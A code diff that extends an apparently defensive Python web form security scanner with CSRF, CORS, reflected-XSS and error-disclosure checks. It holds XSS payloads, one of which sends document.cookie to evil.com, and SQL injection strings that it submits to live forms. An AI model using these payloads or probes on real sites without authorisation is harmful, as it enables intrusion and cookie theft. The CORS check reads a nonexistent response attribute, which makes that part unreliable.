@@ -1,3 +1,4 @@
+import base64
 import re
 import requests
 from urllib.parse import urljoin, urlparse, parse_qs
@@ -35,6 +36,19 @@ SENSITIVE_FIELD_NAMES = [
     "private_key", "privatekey", "ssh_key", "sshkey", "credit_card",
     "cc_number", "card_number", "cvv", "cvc", "ssn", "social_security",
     "pin", "bank_account", "routing_number",
+]
+
+XSS_TEST_PAYLOADS = [
+    '"><script>alert(1)</script>',
+    '"><img src=x onerror=alert(1)>',
+    '\'"><svg onload=alert(1)>',
+    '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
+]
+
+MISLEADING_PASSWORD_NAMES = [
+    "email", "username", "login", "user", "name", "yourname",
+    "firstname", "lastname", "fullname", "nick", "nickname",
+    "phone", "mobile", "address", "city", "zip", "postal",
 ]
 
 FORM_SECURITY_CHECKS = [
@@ -91,8 +105,14 @@ class AdvancedFormAnalyzer:
             warning("Page is served over HTTP — credentials and data transmitted in plaintext")
 
         csrf_meta = soup.find("meta", attrs={"name": re.compile(r"csrf|token", re.I)})
-        if not csrf_meta:
-            pass
+        csrf_in_hidden = bool(soup.find("input", {"type": "hidden", "name": CSRF_INDICATORS}))
+        if not csrf_meta and not csrf_in_hidden:
+            page_issues.append("No CSRF protection detected (no meta CSRF tag and no hidden CSRF fields)")
+            warning("No CSRF protection detected on this page")
+        elif csrf_meta:
+            info("CSRF meta tag found")
+        elif csrf_in_hidden:
+            info("CSRF protection via hidden input fields")
 
         has_sensitive_inputs = bool(soup.find("input", {"type": "password"}))
         if has_sensitive_inputs:
@@ -114,6 +134,38 @@ class AdvancedFormAnalyzer:
                         warning(f"Possible credential/API key in inline script: {script_text[:200]}")
                         page_issues.append(f"Hardcoded credentials in script ({indicator})")
                     break
+
+        section("Phase 1.5: CORS Preflight Check for Form Targets")
+        form_actions = set()
+        for form in forms:
+            action = form.get("action", "") or ""
+            if action and action != "#":
+                form_actions.add(urljoin(final_url, action))
+        if form_actions:
+            for action_url in form_actions:
+                try:
+                    opt_resp = requests.options(action_url, timeout=10,
+                        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"})
+                    cors_headers = {
+                        "Access-Control-Allow-Origin": opt_resp.headers.get("Access-Control-Allow-Origin", ""),
+                        "Access-Control-Allow-Methods": opt_resp.headers.get("Access-Control-Allow-Methods", ""),
+                        "Access-Control-Allow-Credentials": opt_resp.headers.get("Access-Control-Allow-Credentials", ""),
+                    }
+                    if cors_headers["Access-Control-Allow-Origin"]:
+                        if cors_headers["Access-Control-Allow-Origin"] == "*":
+                            warning(f"CORS: {action_url} allows all origins (*)")
+                            page_issues.append(f"CORS wildcard origin on form target: {action_url}")
+                        elif cors_headers["Access-Control-Allow-Credentials"] == "true":
+                            warning(f"CORS: {action_url} allows credentials with specific origin")
+                            page_issues.append(f"CORS with credentials on form target: {action_url}")
+                        if cors_headers["Access-Control-Allow-Methods"]:
+                            info(f"CORS methods for {action_url}: {cors_headers['Access-Control-Allow-Methods']}")
+                    if opt_resp.status == 200 and not cors_headers["Access-Control-Allow-Origin"]:
+                        info(f"OPTIONS on {action_url} returned 200 but no CORS headers (no CORS configured)")
+                except requests.RequestException:
+                    pass
+        else:
+            info("No external form action URLs to check for CORS")
 
         if ollama and ollama.available and forms:
             section("Phase 0: Ollama Form Security Analysis")
@@ -169,7 +221,6 @@ class AdvancedFormAnalyzer:
                     if val and len(val) > 20 and re.match(r'^[A-Za-z0-9+/=]{20,}$', val):
                         warning(f"    Possible Base64-encoded data in hidden field '{name}'")
                         try:
-                            import base64
                             decoded = base64.b64decode(val).decode("utf-8", errors="ignore")
                             if any(k in decoded.lower() for k in ["user", "pass", "token", "admin", "id"]):
                                 warning(f"    Decoded hidden '{name}' contains credentials: {decoded[:80]}")
@@ -245,6 +296,99 @@ class AdvancedFormAnalyzer:
                         except:
                             pass
 
+        section("Phase 4: XSS in Form Fields Detection")
+        xss_findings = []
+        for form in forms[:3]:
+            inputs = form.find_all(["input", "textarea"])
+            text_inputs = [i for i in inputs if i.get("type", "text") in ("text", "search", "url", "email", "textarea")]
+            if text_inputs:
+                for payload in XSS_TEST_PAYLOADS[:2]:
+                    test_form_data = {}
+                    for inp in text_inputs:
+                        inp_name = inp.get("name", "")
+                        if inp_name:
+                            test_form_data[inp_name] = payload
+                    action = form.get("action", "") or ""
+                    action_url = urljoin(final_url, action) if action else final_url
+                    method = form.get("method", "get").upper()
+                    try:
+                        if method == "POST":
+                            xss_resp = requests.post(action_url, data=test_form_data, timeout=10,
+                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
+                                allow_redirects=False)
+                        else:
+                            xss_resp = requests.get(action_url, params=test_form_data, timeout=10,
+                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
+                                allow_redirects=False)
+                        if payload in xss_resp.text:
+                            reflected = xss_resp.text.index(payload)
+                            context = xss_resp.text[max(0, reflected-60):reflected+len(payload)+60]
+                            xss_findings.append(f"XSS payload '{payload[:30]}...' reflected in response from {action_url}")
+                            warning(f"XSS payload reflected in {action_url}: {context[:120]}")
+                            all_issues.append(f"XSS vulnerability: payload '{payload[:30]}...' reflected in form action {action_url}")
+                            break
+                    except requests.RequestException:
+                        pass
+        if not xss_findings:
+            success("No reflected XSS detected in form submissions")
+
+        section("Phase 5: Error Message Information Disclosure Analysis")
+        error_indicators_found = []
+        error_keywords = [
+            "sql", "mysql", "postgresql", "ora-", "driver", "db2_",
+            "warning:", "fatal error", "stack trace", "traceback",
+            "unexpected token", "syntax error", "division by zero",
+            "undefined index", "undefined variable", "invalid argument",
+            "file_get_contents", "include_path", "call to undefined",
+            "exception", "debug", "backtrace", "in /var/www", "in /home/",
+            "on line", "at line",
+        ]
+        for form in forms[:3]:
+            inputs = form.find_all(["input", "textarea"])
+            text_inputs = [i for i in inputs if i.get("type", "text") in ("text", "search", "url", "email", "textarea")]
+            if text_inputs:
+                error_test_values = [
+                    {"type": "sql_injection", "value": "' OR '1'='1"},
+                    {"type": "sql_injection_2", "value": "1' UNION SELECT * FROM users--"},
+                    {"type": "long_string", "value": "A" * 5000},
+                    {"type": "special_chars", "value": "<>%'\"&\\/?<>"},
+                    {"type": "empty", "value": ""},
+                    {"type": "null_byte", "value": "test%00test"},
+                    {"type": "json_injection", "value": '{"test": "value"}'},
+                ]
+                for test_case in error_test_values:
+                    test_form_data = {}
+                    for inp in text_inputs:
+                        inp_name = inp.get("name", "")
+                        if inp_name:
+                            test_form_data[inp_name] = test_case["value"]
+                    action = form.get("action", "") or ""
+                    action_url = urljoin(final_url, action) if action else final_url
+                    method = form.get("method", "get").upper()
+                    try:
+                        if method == "POST":
+                            err_resp = requests.post(action_url, data=test_form_data, timeout=10,
+                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
+                                allow_redirects=False)
+                        else:
+                            err_resp = requests.get(action_url, params=test_form_data, timeout=10,
+                                headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"},
+                                allow_redirects=False)
+                        resp_text = err_resp.text.lower()
+                        for keyword in error_keywords:
+                            if keyword in resp_text:
+                                snippet = err_resp.text[resp_text.index(keyword)-30:resp_text.index(keyword)+len(keyword)+80]
+                                finding = f"Information disclosure via '{test_case['type']}' -> '{keyword}' in response: {snippet[:150]}"
+                                if finding not in error_indicators_found:
+                                    error_indicators_found.append(finding)
+                                    warning(f"Error info disclosure: {finding[:120]}")
+                                    all_issues.append(f"Information disclosure: error message '{keyword}' leaked via {test_case['type']}")
+                                break
+                    except requests.RequestException:
+                        pass
+        if not error_indicators_found:
+            success("No error message information disclosure detected")
+
         all_issues = list(set(all_issues))
         section("Security Analysis Summary")
         if all_issues:
@@ -314,6 +458,8 @@ class AdvancedFormAnalyzer:
                     issues.append("Password field with autocomplete enabled (browser may save passwords)")
                 if inp_name and inp_name.lower() not in ("password", "passwd", "pwd", "pass", "user_pass"):
                     findings.setdefault("unusual_password_field_names", []).append(inp_name)
+                if inp_name and inp_name.lower() in MISLEADING_PASSWORD_NAMES:
+                    issues.append(f"Misleading password field name: '{inp_name}' is type password but named like a non-password field")
 
                 if inp_maxlength:
                     findings["password_maxlength"] = inp_maxlength
